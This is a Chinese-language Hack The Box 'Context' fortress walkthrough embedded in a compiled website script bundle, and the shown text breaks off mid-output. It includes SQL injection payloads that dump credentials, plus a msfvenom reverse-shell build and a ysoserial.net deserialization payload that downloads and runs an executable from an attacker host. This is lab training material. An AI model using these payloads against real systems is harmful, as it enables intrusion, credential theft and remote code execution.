"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[7093],{54473:(A,e,n)=>{n.r(e),n.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>r,toc:()=>c});var t=n(85893),s=n(11151);const a={},i="Context",r={id:"HackTheBox/Fortresses/Context/index",title:"Context",description:"We are a certified cyber security consultancy helping clients avoid potential breaches and to deter, detect and respond to the most sophisticated cyber-attacks. Now a part of Accenture Security, our services include a comprehensive portfolio of advisory and advanced technical cyber security services.",source:"@site/docs/HackTheBox/Fortresses/Context/index.md",sourceDirName:"HackTheBox/Fortresses/Context",slug:"/HackTheBox/Fortresses/Context/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Fortresses/Context/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Fortresses/Context/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Akerva",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Fortresses/Akerva/"},next:{title:"Faraday",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Fortresses/Faraday/"}},l={},c=[{value:"ENTRY POINT",id:"entry-point",level:2},{value:"First of all",id:"first-of-all",level:2},{value:"Introduction",id:"introduction",level:2},{value:"But we have SSL!?",id:"but-we-have-ssl",level:2},{value:"That shouldn&#39;t be there",id:"that-shouldnt-be-there",level:2},{value:"Have we met before?",id:"have-we-met-before",level:2},{value:"Is it a bird? Is it a plane?",id:"is-it-a-bird-is-it-a-plane",level:2},{value:"This looks bad",id:"this-looks-bad",level:2},{value:"It&#39;s not a backdoor, it&#39;s a feature",id:"its-not-a-backdoor-its-a-feature",level:2},{value:"Key to the castle",id:"key-to-the-castle",level:2}];function o(A){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,s.a)(),...A.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.header,{children:(0,t.jsx)(e.h1,{id:"context",children:"Context"})}),"\n",(0,t.jsxs)(e.admonition,{title:"ABOUT Context",type:"note",children:[(0,t.jsx)(e.p,{children:"We are a certified cyber security consultancy helping clients avoid potential breaches and to deter, detect and respond to the most sophisticated cyber-attacks. Now a part of Accenture Security, our services include a comprehensive portfolio of advisory and advanced technical cyber security services."}),(0,t.jsx)(e.p,{children:"\u6211\u4eec\u662f\u4e00\u5bb6\u7ecf\u8fc7\u8ba4\u8bc1\u7684\u7f51\u7edc\u5b89\u5168\u54a8\u8be2\u516c\u53f8\uff0c\u5e2e\u52a9\u5ba2\u6237\u907f\u514d\u6f5c\u5728\u7684\u8fdd\u89c4\u884c\u4e3a\uff0c\u5e76\u963b\u6b62\u3001\u68c0\u6d4b\u548c\u5e94\u5bf9\u6700\u590d\u6742\u7684\u7f51\u7edc\u653b\u51fb\u3002\u73b0\u5728\u4f5c\u4e3a\u57c3\u68ee\u54f2\u5b89\u5168\u7684\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u7684\u670d\u52a1\u5305\u62ec\u5168\u9762\u7684\u54a8\u8be2\u548c\u9ad8\u7ea7\u6280\u672f\u7f51\u7edc\u5b89\u5168\u670d\u52a1\u7ec4\u5408\u3002"})]}),"\n",(0,t.jsx)(e.h2,{id:"entry-point",children:"ENTRY POINT"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"10.13.37.12\n"})}),"\n",(0,t.jsx)(e.h2,{id:"first-of-all",children:"First of all"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.12"',children:"None\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="rustscan --ulimit 5000 10.13.37.12"',children:"Open 10.13.37.12:443\nOpen 10.13.37.12:5985\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.13.37.12"',children:"PORT     STATE SERVICE       VERSION\n443/tcp  open  https?\n| ssl-cert: Subject: commonName=WMSvc-SHA2-WEB\n| Not valid before: 2020-10-12T18:31:49\n|_Not valid after:  2030-10-10T18:31:49\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2070.00; GDR1\n|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB\n| Not valid before: 2024-02-26T01:13:11\n|_Not valid after:  2024-08-27T01:13:11\n| rdp-ntlm-info:\n|   Target_Name: TEIGNTON\n|   NetBIOS_Domain_Name: TEIGNTON\n|   NetBIOS_Computer_Name: WEB\n|   DNS_Domain_Name: TEIGNTON.HTB\n|   DNS_Computer_Name: WEB.TEIGNTON.HTB\n|   DNS_Tree_Name: TEIGNTON.HTB\n|   Product_Version: 10.0.17763\n|_  System_Time: 2024-03-07T04:30:14+00:00\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n"})}),"\n",(0,t.jsx)(e.h2,{id:"introduction",children:"Introduction"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"After a red team fix? The Context fortress has you covered. Teignton Safes is a long-standing physical security company that has built their reputation on building very secure safes. They have recently electronified their records and processes, and are looking to take full advantage of the internet to help them expand into new markets. Before opening up their new infrastructure to the value chain, they have tasked your security company to perform a full penetration test, starting externally and attempting to compromise the internal domain if possible. Can you crack the perimeter and access the internal vault?\n\n\u9700\u8981\u7ea2\u8272\u56e2\u961f\u4fee\u590d\u5417\uff1fContext \u8981\u585e\u53ef\u4ee5\u6ee1\u8db3\u60a8\u7684\u9700\u6c42\u3002Teignton Safes \u662f\u4e00\u5bb6\u5386\u53f2\u60a0\u4e45\u7684\u5b9e\u4f53\u5b89\u5168\u516c\u53f8\uff0c\u5176\u58f0\u8a89\u5efa\u7acb\u5728\u5236\u9020\u975e\u5e38\u5b89\u5168\u7684\u4fdd\u9669\u7bb1\u4e4b\u4e0a\u3002\u4ed6\u4eec\u6700\u8fd1\u7535\u6c14\u5316\u4e86\u4ed6\u4eec\u7684\u8bb0\u5f55\u548c\u6d41\u7a0b\uff0c\u5e76\u5e0c\u671b\u5145\u5206\u5229\u7528\u4e92\u8054\u7f51\u6765\u5e2e\u52a9\u4ed6\u4eec\u62d3\u5c55\u65b0\u5e02\u573a\u3002\u5728\u5411\u4ef7\u503c\u94fe\u5f00\u653e\u5176\u65b0\u57fa\u7840\u8bbe\u65bd\u4e4b\u524d\uff0c\u4ed6\u4eec\u5df2\u8d23\u6210\u60a8\u7684\u5b89\u5168\u516c\u53f8\u6267\u884c\u5168\u9762\u7684\u6e17\u900f\u6d4b\u8bd5\uff0c\u4ece\u5916\u90e8\u5f00\u59cb\uff0c\u5982\u679c\u53ef\u80fd\uff0c\u5c1d\u8bd5\u5165\u4fb5\u5185\u90e8\u57df\u3002\u4f60\u80fd\u7a81\u7834\u8fb9\u754c\u5e76\u8bbf\u95ee\u5185\u90e8\u91d1\u5e93\u5417\uff1f\n"})}),"\n",(0,t.jsx)(e.h2,{id:"but-we-have-ssl",children:"But we have SSL!?"}),"\n",(0,t.jsxs)(e.p,{children:["\u6839\u636e\u9898\u76ee\u540d\u79f0\uff0c\u4ee5\u53ca\u626b\u63cf\u5230\u7684\u7aef\u53e3\u4fe1\u606f\uff0c\u5c1d\u8bd5\u8bbf\u95ee ",(0,t.jsx)(e.code,{children:"https://10.13.37.12/"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(361).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5bf9\u6240\u6709\u5143\u7d20\u8fdb\u884c\u63a2\u6d4b\uff0c\u53d1\u73b0 ",(0,t.jsx)(e.code,{children:"https://10.13.37.12/Home/Staff"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-html",metastring:'title="https://10.13.37.12/Home/Staff"',children:"......\n\x3c!-- todo: Set up Abbie on the portal, she'll be taking over my duties while I'm away.\nKarl if I forget to do this, it's jay.teignton:admin for the portal\nCONTEXT{s3cur1ty_thr0ugh_0bscur1ty}\n--\x3e\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="Flag"',children:"CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"that-shouldnt-be-there",children:"That shouldn't be there"}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u4e0a\u4e00\u9898\u4e2d\uff0c\u5f97\u5230\u4e00\u4e2a\u51ed\u636e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"jay.teignton:admin\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u5728 ",(0,t.jsx)(e.code,{children:"https://10.13.37.12/Admin"})," \u4e2d\u4f7f\u7528\u8fd9\u4e2a\u51ed\u636e\u8fdb\u884c\u767b\u5f55"]}),"\n",(0,t.jsxs)(e.p,{children:["\u6210\u529f\u8bbf\u95ee\u5230 ",(0,t.jsx)(e.code,{children:"https://10.13.37.12/Admin/Management"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(58470).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u9875\u9762\u4e0a\u53d1\u73b0\u4e00\u4e2a\u8bb0\u5f55\u6dfb\u52a0\u529f\u80fd\uff0c\u901a\u8fc7\u6293\u5305\u67e5\u770b\u6dfb\u52a0\u8bb0\u5f55\u65f6\u7684\u6570\u636e\u5305"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:'POST /Admin/AddProduct HTTP/2\nHost: 10.13.37.12\nCookie: .AspNetCore.Antiforgery.oS4Q00mERc0=CfDJ8Ac4GTcJHhJOho1Cp4jIx8fpAHs09j0CJnKRMPA1xyi-GFo8_9jclZ-SL4lDAymLzYrcZIvMOzMUSqgTLKSQlz3L2rw6nacGwSszqS2vDBENvaSfyhFuAt7BG5qYbEy85FKR0MHFiHIdL82HY5Om71g; .AspNetCore.Session=CfDJ8Ac4GTcJHhJOho1Cp4jIx8fQjqfSQxIaGrgMc8oWe2QNaLlHEhdNrJ2JhOZ%2Fje1%2BG19SVyuYXK0agn1MmIRoXmJGUtvHCJPDlTvyq3B13gwlhfmEibcI0ioA1j%2FEwN1MvbrVfr0qR%2FN6H9a3uCyP%2BXaCYngh0%2F59XBAbLu37Lf6w\nContent-Length: 227\nCache-Control: max-age=0\nSec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: "Windows"\nUpgrade-Insecure-Requests: 1\nOrigin: https://10.13.37.12\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://10.13.37.12/Admin/Management\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=0, i\n\nname=a&price=1&creationYear=2000&certified=1&__RequestVerificationToken=CfDJ8Ac4GTcJHhJOho1Cp4jIx8eSyOhHUtIDXKAVUYmOBn0oXkzWglsBP_LQvBoanyPr0KdnFu-IOkTS6xjULVhRlv49hVfJF-BK8Y4pjh4D1gM5F-UZuof47s-EHdnmV0TCJQ4TZPwnAMvuJsGfQebi6JM\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u5728 ",(0,t.jsx)(e.code,{children:"name"})," \u53c2\u6570\u4e2d\u8fdb\u884c sql \u6ce8\u5165"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:"title=\"'+(select db_name())+'  \"",children:"webapp\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:"title=\"'+(select name from webapp..sysobjects where xtype ='U'order by name offset 1 rows fetch next 1 rows only)+'\"",children:"users\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:"title=\"'+(select top 1 username from users order by username)+'\"",children:"abbie.buckfast\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:"title=\"'+(select top 1 password from users order by username)+'\"",children:"AMkru$3_f'/Q^7f?\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u65f6\uff0c\u8fd8\u80fd\u5728\u6570\u636e\u5e93\u4e2d\u627e\u5230"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:"title=\"'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'\"",children:"CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"have-we-met-before",children:"Have we met before?"}),"\n",(0,t.jsx)(e.p,{children:"\u5bf9\u7ad9\u70b9\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"[12:11:36] 200 -    3KB - /ADMIN\n[12:11:38] 200 -    3KB - /Admin\n[12:11:44] 401 -    0B  - /Microsoft-Server-ActiveSync/\n[12:11:46] 302 -  208B  - /OWA/  ->  https://10.13.37.12/owa/auth/logon.aspx?url=https%3a%2f%2f10.13.37.12%2fOWA%2f&reason=0\n[12:12:07] 200 -    3KB - /admin\n[12:12:09] 200 -    3KB - /admin/\n[12:12:09] 200 -    3KB - /admin/?/login\n[12:12:11] 200 -    3KB - /admin/index\n[12:13:07] 302 -  208B  - /ecp/  ->  https://10.13.37.12/owa/auth/logon.aspx?url=https%3a%2f%2f10.13.37.12%2fecp%2f&reason=0\n[12:13:13] 200 -   31KB - /favicon.ico\n[12:13:20] 200 -    2KB - /home\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee ",(0,t.jsx)(e.code,{children:"https://10.13.37.12/owa/"})," \u540e\uff0c\u4f7f\u7528\u4ee5\u4e0b\u51ed\u636e\u8fdb\u884c\u767b\u5f55"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"abbie.buckfast : AMkru$3_f'/Q^7f?\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u6210\u529f\u8bbf\u95ee ",(0,t.jsx)(e.code,{children:"Outlook"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(17226).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728\u5bf9 ",(0,t.jsx)(e.code,{children:"Open another mailbox..."})," \u529f\u80fd\u8fdb\u884c\u63a2\u6d4b\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u53ef\u4ee5\u8bbf\u95ee ",(0,t.jsx)(e.code,{children:"jay.teignton@teignton.htb"})," \u8fd9\u4e2a\u90ae\u7bb1"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(29865).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u53d1\u4ef6\u7bb1\u4e2d\u627e\u5230\u4fe1\u606f"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(58824).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="Flag"',children:"CONTEXT{wh00000_4re_y0u?}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"is-it-a-bird-is-it-a-plane",children:"Is it a bird? Is it a plane?"}),"\n",(0,t.jsxs)(e.p,{children:["\u5728 ",(0,t.jsx)(e.code,{children:"jay.teignton@teignton.htb"})," \u7684\u6536\u4ef6\u7bb1\u4e2d\uff0c\u627e\u5230 ",(0,t.jsx)(e.code,{children:"Karl Memaybe"})," \u53d1\u7684\u4e00\u5c01\u90ae\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"Hi Jay,\n\nDo you even have the code anymore, or did you lose it when your GitHub account got hacked?\n\nI've attached it, try not to lose it again.\n\nKarl\n\n----------\nFrom: Jay Teignton\nSent: 13 October 2020 10:53:28\nTo: Karl Memaybe\nSubject: Fw: Website Status\n\nMan, my dad is stressing me over the website. Have you fixed the vulnerability yet? That defect was identified last year!!!! I know you've spent the last six months revising for CEH, but I've yet to see any tangible evidence of your security skills!\n\nKind Regards,\nJay\n\n----------\nFrom: Andy Teignton\nSent: 13 October 2020 10:51\nTo: Jay Teignton\nSubject: Website Status\n\nSon, have you finished the website yet? I login to the admin panel and all I see is \"work in progress\" on the page?!\n\nI desperately need to look over the specifications for the IceMouth safe as our clients are waiting!\n\nBest Wishes,\nDad\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u540c\u65f6\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6 ",(0,t.jsx)(e.code,{children:"WebApplication.zip"})]}),"\n",(0,t.jsx)(e.p,{children:"\u538b\u7f29\u5305\u7684\u6587\u4ef6\u7ed3\u6784\u4e3a"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"D:.\n\u2502  Database.cs\n\u2502  favicon.ico\n\u2502  Global.asax\n\u2502  Global.asax.cs\n\u2502  LICENCE.txt\n\u2502  packages.config\n\u2502  Profile.cs\n\u2502  Web.config\n\u2502  Web.Debug.config\n\u2502  Web.Release.config\n\u2502  WebApplication.csproj\n\u2502  WebApplication.csproj.user\n\u2502\n\u251c\u2500App_Data\n\u251c\u2500App_Start\n\u2502      BundleConfig.cs\n\u2502      FilterConfig.cs\n\u2502      RouteConfig.cs\n\u2502\n\u251c\u2500bin\n\u251c\u2500Content\n\u2502  \u2502  bootstrap-theme.css\n\u2502  \u2502  bootstrap-theme.css.map\n\u2502  \u2502  bootstrap-theme.min.css\n\u2502  \u2502  bootstrap-theme.min.css.map\n\u2502  \u2502  bootstrap.css\n\u2502  \u2502  bootstrap.css.map\n\u2502  \u2502  bootstrap.min.css\n\u2502  \u2502  bootstrap.min.css.map\n\u2502  \u2502  Site.css\n\u2502  \u2502\n\u2502  \u2514\u2500assets\n\u2502          safe1.jpg\n\u2502          Thumbs.db\n\u2502\n\u251c\u2500Controllers\n\u2502      AdminController.cs\n\u2502      HomeController.cs\n\u2502\n\u251c\u2500fonts\n\u2502      glyphicons-halflings-regular.eot\n\u2502      glyphicons-halflings-regular.svg\n\u2502      glyphicons-halflings-regular.ttf\n\u2502      glyphicons-halflings-regular.woff\n\u2502      glyphicons-halflings-regular.woff2\n\u2502\n\u251c\u2500Models\n\u251c\u2500obj\n\u2502  \u251c\u2500Debug\n\u2502  \u2502  \u2502  DesignTimeResolveAssemblyReferencesInput.cache\n\u2502  \u2502  \u2502  TemporaryGeneratedFile_036C0B5B-1481-4323-8D20-8F5ADCB23D92.cs\n\u2502  \u2502  \u2502  TemporaryGeneratedFile_5937a670-0e60-4077-877b-f7221da3dda1.cs\n\u2502  \u2502  \u2502  TemporaryGeneratedFile_E7A71F73-0F8D-4B9B-B56E-8E70B10BC5D3.cs\n\u2502  \u2502  \u2502  WebApplication.csproj.CopyComplete\n\u2502  \u2502  \u2502  WebApplication.csproj.CoreCompileInputs.cache\n\u2502  \u2502  \u2502  WebApplication.csproj.FileListAbsolute.txt\n\u2502  \u2502  \u2502  WebApplication.csprojAssemblyReference.cache\n\u2502  \u2502  \u2502  WebApplication.dll\n\u2502  \u2502  \u2502  WebApplication.pdb\n\u2502  \u2502  \u2502\n\u2502  \u2502  \u2514\u2500TempPE\n\u2502  \u2514\u2500Release\n\u2502      \u2502  TemporaryGeneratedFile_036C0B5B-1481-4323-8D20-8F5ADCB23D92.cs\n\u2502      \u2502  TemporaryGeneratedFile_5937a670-0e60-4077-877b-f7221da3dda1.cs\n\u2502      \u2502  TemporaryGeneratedFile_E7A71F73-0F8D-4B9B-B56E-8E70B10BC5D3.cs\n\u2502      \u2502  WebApplication.csproj.CopyComplete\n\u2502      \u2502  WebApplication.csproj.CoreCompileInputs.cache\n\u2502      \u2502  WebApplication.csproj.FileListAbsolute.txt\n\u2502      \u2502  WebApplication.dll\n\u2502      \u2502  WebApplication.pdb\n\u2502      \u2502\n\u2502      \u2514\u2500TempPE\n\u251c\u2500Properties\n\u2502      AssemblyInfo.cs\n\u2502\n\u251c\u2500Scripts\n\u2502      bootstrap.js\n\u2502      bootstrap.min.js\n\u2502      jquery-3.4.1.intellisense.js\n\u2502      jquery-3.4.1.js\n\u2502      jquery-3.4.1.min.js\n\u2502      jquery-3.4.1.min.map\n\u2502      jquery-3.4.1.slim.js\n\u2502      jquery-3.4.1.slim.min.js\n\u2502      jquery-3.4.1.slim.min.map\n\u2502      jquery.validate-vsdoc.js\n\u2502      jquery.validate.js\n\u2502      jquery.validate.min.js\n\u2502      jquery.validate.unobtrusive.js\n\u2502      jquery.validate.unobtrusive.min.js\n\u2502      modernizr-2.8.3.js\n\u2502\n\u2514\u2500Views\n    \u2502  Web.config\n    \u2502  _ViewStart.cshtml\n    \u2502\n    \u251c\u2500Admin\n    \u2502      Index.cshtml\n    \u2502      Management.cshtml\n    \u2502\n    \u251c\u2500Home\n    \u2502      Contact.cshtml\n    \u2502      Index.cshtml\n    \u2502      Privacy.cshtml\n    \u2502      Products.cshtml\n    \u2502      Staff.cshtml\n    \u2502\n    \u2514\u2500Shared\n            Error.cshtml\n            _Layout.cshtml\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728 ",(0,t.jsx)(e.code,{children:"Views\\_ViewStart.cshtml"})," \u4e2d"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-csharp",children:'@{\n    Layout = "~/Views/Shared/_Layout.cshtml";\n}\n\n@using System.Text;\n@using System.Web.Script.Serialization;\n@{\n    if (0 != Context.Session.Keys.Count) {\n        if (null != Context.Request.Cookies.Get("Profile")) {\n            try {\n                byte[] data = Convert.FromBase64String(Context.Request.Cookies.Get("Profile")?.Value);\n                string str = UTF8Encoding.UTF8.GetString(data);\n\n                SimpleTypeResolver resolver = new SimpleTypeResolver();\n                JavaScriptSerializer serializer = new JavaScriptSerializer(resolver);\n\n                object obj = (serializer.Deserialize(str, typeof(object)) as Profile);\n                // todo: create profile to change the language and font of the website\n            } catch (Exception e) {\n            }\n        }\n    }\n}\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u8fd9\u91cc\u5bb9\u6613\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u5f71\u54cd"}),"\n",(0,t.jsxs)(e.p,{children:["\u9996\u5148\uff0c\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"msfvenom"})," \u751f\u6210 c2 \u6076\u610f\u8d1f\u8f7d"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.16.2 LPORT=9999 -f exe -o exploit.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 1889 bytes\nFinal size of exe file: 8192 bytes\nSaved as: exploit.exe\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u7136\u540e\u4f7f\u7528 ",(0,t.jsx)(e.a,{href:"https://github.com/NHPT/ysoserial.net",children:"Github - NHPT/ysoserial.net"})," \u751f\u6210\u53cd\u5e8f\u5217\u5316\u8d1f\u8f7d"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'PS D:\\_Tools\\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\\Release> .\\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.10.16.2/exploit.exe -o C:\\exploit.exe"\new0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMC4xNi4yL2V4cGxvaXQuZXhlIC1vIEM6XFxleHBsb2l0LmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u901a\u8fc7 python \u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u6295\u653e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ sudo python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\uff0c\u5f00\u53d1\u8005\u5de5\u5177\uff0c\u6dfb\u52a0\u4e00\u4e2a Cookie"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"Profile:ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMC4xNi4yL2V4cGxvaXQuZXhlIC1vIEM6XFxleHBsb2l0LmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(72539).Z+"",width:"2560",height:"1373"})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(97473).Z+"",width:"2560",height:"1426"})}),"\n",(0,t.jsx)(e.p,{children:"\u6210\u529f\u89e6\u53d1\u53cd\u5e8f\u5217\u5316"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ sudo python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 